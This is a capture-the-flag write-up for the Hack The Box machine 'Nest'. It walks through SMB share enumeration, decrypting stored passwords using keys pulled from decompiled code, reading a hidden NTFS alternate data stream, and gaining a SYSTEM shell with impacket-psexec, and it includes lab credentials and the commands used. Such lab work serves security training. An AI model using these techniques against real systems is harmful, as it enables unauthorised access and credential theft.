[WORKGROUP\\TempUser]:Try \"help\" to get a list of possible commands.smb: \\&gt; cd IT/Carlsmb: \\IT\\Carl\\&gt; ls  .                                   D        0  Wed Aug  7 12:42:14 2019  ..                                  D        0  Wed Aug  7 12:42:14 2019  Docs                                D        0  Wed Aug  7 12:44:00 2019  Reports                             D        0  Tue Aug  6 06:45:40 2019  VB Projects                         D        0  Tue Aug  6 07:41:55 2019                5242623 blocks of size 4096. 1840038 blocks availablesmb: \\IT\\Carl\\&gt; recurse onsmb: \\IT\\Carl\\&gt; prompt offsmb: \\IT\\Carl\\&gt; mget *getting file \\IT\\Carl\\Docs\\ip.txt of size 56 as Docs/ip.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)getting file \\IT\\Carl\\Docs\\mmc.txt of size 73 as Docs/mmc.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner.sln of size 871 as VB Projects/WIP/RU/RUScanner.sln (2.1 KiloBytes/sec) (average 0.8 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\ConfigFile.vb of size 772 as VB Projects/WIP/RU/RUScanner/ConfigFile.vb (1.6 KiloBytes/sec) (average 1.0 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\Module1.vb of size 279 as VB Projects/WIP/RU/RUScanner/Module1.vb (0.6 KiloBytes/sec) (average 0.9 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\RU Scanner.vbproj of size 4828 as VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj (8.8 KiloBytes/sec) (average 2.5 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\RU Scanner.vbproj.user of size 143 as VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user (0.3 KiloBytes/sec) (average 2.2 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\SsoIntegration.vb of size 133 as VB Projects/WIP/RU/RUScanner/SsoIntegration.vb (0.3 KiloBytes/sec) (average 1.9 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\Utils.vb of size 4888 as VB Projects/WIP/RU/RUScanner/Utils.vb (9.0 KiloBytes/sec) (average 2.8 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Application.Designer.vb of size 441 as VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb (1.1 KiloBytes/sec) (average 2.7 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Application.myapp of size 481 as VB Projects/WIP/RU/RUScanner/My Project/Application.myapp (1.2 KiloBytes/sec) (average 2.6 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\AssemblyInfo.vb of size 1163 as VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb (2.8 KiloBytes/sec) (average 2.6 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Resources.Designer.vb of size 2776 as VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb (4.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Resources.resx of size 5612 as VB Projects/WIP/RU/RUScanner/My Project/Resources.resx (10.7 KiloBytes/sec) (average 3.4 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Settings.Designer.vb of size 2989 as VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb (5.4 KiloBytes/sec) (average 3.6 KiloBytes/sec)getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Settings.settings of size 279 as VB Projects/WIP/RU/RUScanner/My Project/Settings.settings (0.6 KiloBytes/sec) (average 3.4 KiloBytes/sec)smb: \\IT\\Carl\\&gt;Apprently we just found a VisualBasic project named RUScanner. Interesting…FootholdAnalyzing VB Project Source CodeSince we found a Visual Studio Project we can use it to analyze the source code.Oh no… I forgot about it — I don’t know Visual Basic, but no problem; there’s a great extension in Visual Studio that will help us convert an entire VB project code into C# code, just in case you prefer reading C# code.Here’s also the GitHub Repository of theextention.Another way to do this is building the source code and then analyze the binaries using dnSpy for example.  Taking a look to Main methodThe entry point for the project is in the Module1.cs class. It seems that this class is trying to create an instance of ConfigFile class using a file named RU_Config.xml, and then creating another instance for SsoIntegration class using ConfigFile object properties, such as, Config.Username and applying a method called DecryptString from the Utils class to Config.Password.  Decrypting c.smith passwordIf we run the application it will fail, since we don’t have the RU_Config.xml file… Or do we? Remember we saw an encrypted password that came from a file called RU_Config.xml?❯ smbclient \"//10.10.10.178/Data/\" -U \"TempUser\" -c 'get \"IT/Configs/RU Scanner/RU_config.xml\" -'Password for [WORKGROUP\\TempUser]:&lt;?xml version=\"1.0\"?&gt;&lt;ConfigFile xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;  &lt;Port&gt;389&lt;/Port&gt;  &lt;Username&gt;c.smith&lt;/Username&gt;  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;&lt;/ConfigFile&gt;getting file \\IT\\Configs\\RU Scanner\\RU_config.xml of size 270 as - (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)Well, we can copy this file into the project and see what happens.If we run the project, we will get an System.IO.FileNotFoundException, indicating that RU_Config.xml file could not be found.So we just need to copy RU_Config.xml file from the SMB Data Share to the path where the application is looking for it… And then the error will disappear.So, now we can simply print the SsoIntegration password attribute, as it contains the decrypted password.Another way to get the decrypted password is just calling the DecryptString method from Utils.cs class and pass the encrypted password as an argument, this is a more direct approach.So nice, we got credentials for c.smith user.First I am going use CrackMapExec to confirm if these are valid credentials.❯ crackmapexec smb 10.10.10.178 -u c.smith -p \"xRxRxPANCAK3SxRxRx\"SMB         10.10.10.178    445    HTB-NEST         [*] Windows 7 / Server 2008 R2 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\\c.smith:xRxRxPANCAK3SxRxRxAlright, now we’ve got access to c.smith account. Let’s see what can we do with this user…Enumerating with C.Smith  Enumerating SMBWe will find some resources in the C.Smith share, including the user flag and another folder named HQK Reporting❯ smbclient \"//10.10.10.178/Users/\" -U \"c.smith%xRxRxPANCAK3SxRxRx\"Try \"help\" to get a list of possible commands.smb: \\&gt; cd C.Smithsmb: \\C.Smith\\&gt; ls  .                                   D        0  Sun Jan 26 00:21:44 2020  ..                                  D        0  Sun Jan 26 00:21:44 2020  HQK Reporting                       D        0  Thu Aug  8 16:06:17 2019  user.txt                            A       34  Sun Sep  1 12:49:58 2024                5242623 blocks of size 4096. 1839358 blocks availablesmb: \\C.Smith\\&gt;So now let’s get those files into our machine and investigate them.❯ cd SMB/Users/C.Smith❯ smbclient \"//10.10.10.178/Users/\" -U \"c.smith%xRxRxPANCAK3SxRxRx\"Try \"help\" to get a list of possible commands.smb: \\&gt; cd C.Smithsmb: \\C.Smith\\&gt; recurse onsmb: \\C.Smith\\&gt; prompt offsmb: \\C.Smith\\&gt; mget *getting file \\C.Smith\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)getting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt of size 0 as HQK Reporting/Debug Mode Password.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)getting file \\C.Smith\\HQK Reporting\\HQK_Config_Backup.xml of size 249 as HQK Reporting/HQK_Config_Backup.xml (0.7 KiloBytes/sec) (average 0.3 KiloBytes/sec)getting file \\C.Smith\\HQK Reporting\\AD Integration Module\\HqkLdap.exe of size 17408 as HQK Reporting/AD Integration Module/HqkLdap.exe (23.0 KiloBytes/sec) (average 10.1 KiloBytes/sec)smb: \\C.Smith\\&gt; exit❯ cat user.txt───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: user.txt───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │ 1ab7d1...───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Privilege EscalationIf we dive into the HQK Reporting folder, we will find some interesting files.There is a file named Debug Mode Password.txt, but it is empty.Reading the HQK_Config_Backup.xml file we’ll find an element containing the same port we saw for Reporting Service V1.2 (4386).❯ cat HQK_Config_Backup.xml───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: HQK_Config_Backup.xml───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │ &lt;?xml version=\"1.0\"?&gt;   2   │ &lt;ServiceSettings xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;   3   │   &lt;Port&gt;4386&lt;/Port&gt;   4   │   &lt;QueryDirectory&gt;C:\\Program Files\\HQK\\ALL QUERIES&lt;/QueryDirectory&gt;   5   │ &lt;/ServiceSettings&gt;───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────We can use telnet to interact with that service and investigate what it does.Interacting with HQK ServiceConnecting with the service, we discovered that we’re dealing with a service named HQK Reporting Service V1.2, I’m not sure if this service was developed for this machine or if it is actually used in real environments, anyway I couldn’t find any information on Google.❯ telnet 10.10.10.178 4386Trying 10.10.10.178...Connected to 10.10.10.178.Escape character is '^]'.HQK Reporting Service V1.2&gt;?Unrecognised command&gt;helpThis service allows users to run queries against databases using the legacy HQK format--- AVAILABLE COMMANDS ---LISTSETDIR &lt;Directory_Name&gt;RUNQUERY &lt;Query_ID&gt;DEBUG &lt;Password&gt;HELP &lt;Command&gt;&gt;Using the Help command we see five available commands.  LIST will list the content of the actual directory (like ls).  SETDIR will change the current directory(like cd).  RUNQUERY will fail due an invalid database configuration.  DEBUG is unknown, it requires a password.Unfortunately, there isn’t much we can do with these commands. There is no point on navigate the file system if we can’t read files with RUNQUERY command.But we still don’t know what the DEBUG command does. If only we had the password…There ins’t much we can do with the HqkLdap.exe binary except waste our time trying to find something in it’s source code.If we remember there were a file named Debug Mode Password.txt, but it was empty.Damn, a dead end?! It was for me.ADS In SMB Share  ADS ConceptNTFS file systems have a feature called Alternate Data Streams, this allows you to add a another data stream to a file, this means that you can add aditional data to be associated with a file or directory beyond the standard data stream. This allow you to ‘hide’ any type of file within another one (executables, images, videos, etc). Something scary about ADS is that this attribute is not visible in Windows File Explorer, it doesn’t modify the size of the file and it will not change checksum values.While NTFS uses ADS primarily to store metadata and extended attributes, it can also be used to store files.If you want to know learn more about ADS, I’d recommend this article:How NTFS Alternate Data Streams Introduce Security Vulnerability.  Looking for ADS AttributeWe can return to the C.Smith SMB Share and search for detailed metadata information, we can do it using the allinfo &lt;file&gt; SMB command.❯ smbclient \"//10.10.10.178/Users/\" -U \"c.smith%xRxRxPANCAK3SxRxRx\"Try \"help\" to get a list of possible commands.smb: \\&gt; cd C.Smithsmb: \\C.Smith\\&gt; cd \"HQK Reporting\"smb: \\C.Smith\\HQK Reporting\\&gt; allinfo ./HQK_Config_Backup.xmlaltname: HQK_CO~1.XMLcreate_time:    Wed Aug  7 02:12:31 PM 2019 MSTaccess_time:    Thu Aug  8 03:59:35 AM 2019 MSTwrite_time:     Thu Aug  8 04:09:06 PM 2019 MSTchange_time:    Wed Jul 21 11:47:15 AM 2021 MSTattributes: A (20)stream: [::$DATA], 249 bytessmb: \\C.Smith\\HQK Reporting\\&gt;The primary data stream of a file is always named $DATA. As we can see, this is the only data stream in the HQK_Config_Backup.xml file. Let’s examine other files to see if there are additional data streams.We’ve found an additional data stream in the Debug Mode Password.txt file named Password, it appears to contain the password needed to access the HQK Service with DEBUG privileges.smb: \\C.Smith\\HQK Reporting\\&gt; allinfo \"Debug Mode Password.txt\"altname: DEBUGM~1.TXTcreate_time:    Thu Aug  8 04:06:12 PM 2019 MSTaccess_time:    Thu Aug  8 04:06:12 PM 2019 MSTwrite_time:     Thu Aug  8 04:08:17 PM 2019 MSTchange_time:    Wed Jul 21 11:47:12 AM 2021 MSTattributes: A (20)stream: [::$DATA], 0 bytesstream: [:Password:$DATA], 15 bytessmb: \\C.Smith\\HQK Reporting\\&gt; get \"Debug Mode Password.txt\":Passwordgetting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)smb: \\C.Smith\\HQK Reporting\\&gt;❯ cat Debug\\ Mode\\ Password.txt:Password───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: Debug Mode Password.txt:Password───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │ WBQ201953D8w───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────HQK Service DEBUG ModeWe’ve obtained DEBUG and now we have access to a few new commands. However, we still can’t execute queries and continue receiving the same error message.❯ telnet 10.10.10.178 4386Trying 10.10.10.178...Connected to 10.10.10.178.Escape character is '^]'.HQK Reporting Service V1.2&gt;DEBUG WBQ201953D8wDebug mode enabled. Use the HELP command to view additional commands that are now available&gt;HELPThis service allows users to run queries against databases using the legacy HQK format--- AVAILABLE COMMANDS ---LISTSETDIR &lt;Directory_Name&gt;RUNQUERY &lt;Query_ID&gt;DEBUG &lt;Password&gt;HELP &lt;Command&gt;SERVICESESSIONSHOWQUERY &lt;Query_ID&gt;&gt;The SERVICE command provices information about server such as, the server hostname, a path to the service executable, and some other details.The SESSION also gives information, but it’s even less useful.The SHOWQUERY &lt;Query_Id&gt; command appears to query certain attributes in the files, interesting…&gt;LISTUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY[DIR]  COMPARISONS[1]   Invoices (Ordered By Customer)[2]   Products Sold (Ordered By Customer)[3]   Products Sold In Last 30 DaysCurrent Directory: ALL QUERIES&gt;SHOWQUERY 1TITLE=Invoices (Ordered By Customer)QUERY_MODE=VIEWQUERY_TYPE=INVOICESORTBY=CUSTOMERDATERANGE=ALLRemember that we can use SETDIR command to change our location in the filesystem. So now we can use SHOWQUERY command to obtain file information or even read the files. Look:&gt;SETDIR ..\\Current directory set to HQK&gt;LISTUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY[DIR]  ALL QUERIES[DIR]  LDAP[DIR]  Logs[1]   HqkSvc.exe[2]   HqkSvc.InstallState[3]   HQK_Config.xmlCurrent Directory: HQK&gt;SHOWQUERY 3&lt;?xml version=\"1.0\"?&gt;&lt;ServiceSettings xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;  &lt;Port&gt;4386&lt;/Port&gt;  &lt;DebugPassword&gt;WBQ201953D8w&lt;/DebugPassword&gt;  &lt;QueryDirectory&gt;C:\\Program Files\\HQK\\ALL QUERIES&lt;/QueryDirectory&gt;&lt;/ServiceSettings&gt;While navigating the filesystem, we’ll find a folder named LDAP. This folder contains two files:  HqkLdap.exe (the same binary found in C.Smith SMB share)  Ldap.confThe second one (Ldap.conf) seems very interesting. Let’s take a look at it’s content.&gt;listUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY[1]   HqkLdap.exe[2]   Ldap.confCurrent Directory: ldap&gt;showquery 2Domain=nest.localPort=389BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=localUser=AdministratorPassword=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=Nice, it’s the administrator password!, Right?Well, just like with C.Smith’s password, this one is encrypted, we can try using RuScanner decryption function, as we did with C.Smith’s password, but it will fail since it’s using different values for encryption.xxd &lt;(base64 -d  &lt;&lt;&lt; \"yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=\")00000000: cb21 2ad1 4bef 86ad ae40 e716 1bca 5e2e  .!*.K....@....^.00000010: 8791 41e8 6a8a 9fdf 29d7 86fe 48c4 55be  ..A.j...)...H.U.Diving into the HqkLdap.exe source codeWe found some very interesting attributes. If we decompile the HqkLdap.exe binary using dnSpy and navigate to MainModule class, we will see the purpose of Ldap.Conf. Let’s see where is being used.We can see that there are things happening here; the application is doing the following:1.- Verify the count of commandline arguments is equal to one.if (MyProject.Application.CommandLineArgs.Count != 1)2.- Verify that the file specified in the argument exists. (Here is where Ldap.conf must be)else if (!File.Exists(MyProject.Application.CommandLineArgs[0]))  Verify that the HqkDbImport.exe file exists.else if (!File.Exists(\"HqkDbImport.exe\"))4.- Break the file specified in the arguments into a string array separated by line feeds.string[] array = File.ReadAllLines(MyProject.Application.CommandLineArgs[0]);5.- Iterate over the string arrayforeach (string text in array){  ///}6.- Verify is the current string starts with “Domain=”. if it does, assign it as a property in the ldapSearchSettings object. Do the same for “User=” and “Password=” for the corresponging values in the string array.if (text.StartsWith(\"Domain=\", StringComparison.CurrentCultureIgnoreCase)){\tldapSearchSettings.Domain = text.Substring(text.IndexOf('=') + 1);}else if (text.StartsWith(\"User=\", StringComparison.CurrentCultureIgnoreCase)){\tldapSearchSettings.Username = text.Substring(text.IndexOf('=') + 1);}else if (text.StartsWith(\"Password=\", StringComparison.CurrentCultureIgnoreCase)){\tldapSearchSettings.Password = CR.DS(text.Substring(text.IndexOf('=') + 1));}Once the ldapSearchSettings object has Domain, Username and Password attributes, it creates an instance of the Ldap class using these attributes. It then uses this instance to call the Ldap.FindUsers method and save the result in a generic list of strings.Ldap ldap = new Ldap();ldap.Username = ldapSearchSettings.Username;ldap.Password = ldapSearchSettings.Password;ldap.Domain = ldapSearchSettings.Domain;Console.WriteLine(\"Performing LDAP query...\");List&lt;string&gt; list = ldap.FindUsers();Then iterate through list of users, print each user’s value and execute HqkDbImport.exe /ImportLdapUser &lt;user&gt; for each one. We don’t know exactly what ‘HqkDbImport.exe’ does, but we know that it performs some kind of user import to a database.foreach (string text2 in list){\tConsole.WriteLine(text2);\tProcess.Start(\"HqkDbImport.exe /ImportLdapUser \" + text2);}When the program iterates over the file passed with the cmdline arguments we can see that it’s doing something to the password before assigning it to ldapSearchSettings.Password.else if (text.StartsWith(\"Password=\", StringComparison.CurrentCultureIgnoreCase)){      ldapSearchSettings.Password = CR.DS(text.Substring(text.IndexOf('=') + 1));}It is applying a function named CR.DS to the password. Let’s investigate what this function does.We can see that CR.DS receives an encrypted string as a parameter, then passes it to CR.RD method as a parameter.Let’s see more about CR.RD:I don’t know exactly how this code works, but I know it decrypts an AES ciphertext in CBC Mode using a PBKDF2 key. So, we can try to use these values in order to decrypt the administrator password.We can get the encryption parameters looking at the encryption/decryption functions (CR.ES/CR.DS), let’s take a look into the decryption functions.public static string DS(string EncryptedString){    if (string.IsNullOrEmpty(EncryptedString))    {    return string.Empty;    }    return CR.RD(EncryptedString, \"667912\", \"1313Rf99\", 3, \"1L1SA61493DRV53Z\", 256);}private static string RD(string cipherText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize){    byte[] bytes = Encoding.ASCII.GetBytes(initVector);    byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);    byte[] array = Convert.FromBase64String(cipherText);    ...}We can see that RD is receiving the parameters in the following order:cipherText, passPhrase, saltValue, etc. Based on the parameters DS passes to RD, we can conclude that:            Key      Value                  passPhrase      667912              saltValue      1313Rf99              passwordIterations      3              Init Vector      1L1SA61493DRV53Z              keySize      256      Decrypting Administrator PasswordWell, I came up with three differents way to do this.  Using Cyberchef  Copying the decrypt function (RD) and passing the encrypted password (just as we did with C.Smith’s password).  Copying the Ldap.conf file from HQK Service and pass it to the HqkLdap binary as an argument; then use breakpoints to read theldapSearchSettings Password property.else if (text.StartsWith(\"Password=\", StringComparison.CurrentCultureIgnoreCase)){  ldapSearchSettings.Password = CR.DS(text.Substring(text.IndexOf('=') + 1)); // Here}I’m going to do the first one, as I already did the second one and I’m to lazy to do the third.CyberchefWe can use CyberChef to create the PBKDF2 key, and the use it to decrypt the password.To create the PBKDF2 key, we need the following values:  A Passphrase  The key size  Number of iterations  A salt value  Getting the keyNice, we’ve got the key; now let’s decrypt the password.  Getting the passwordAnd there it is the administrator password. Now let’s try to use these credentials to gain administrator access and read the root flag.❯ impacket-psexec Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178Impacket v0.12.0.dev1 - Copyright 2023 Fortra[*] Requesting shares on 10.10.10.178.....[*] Found writable share ADMIN$[*] Uploading file kfKTarfJ.exe[*] Opening SVCManager on 10.10.10.178.....[*] Creating service kjNv on 10.10.10.178.....[*] Starting service kjNv.....[!] Press help for extra shell commandsMicrosoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation.  All rights reserved.C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\Desktop\\root.txt56c9b8c7e...C:\\Windows\\system32&gt;And that’s all. I enjoyed this machine a lot, but I don’t know what the author was thinking when he cataloged it as an easy machine."
  }
  
]

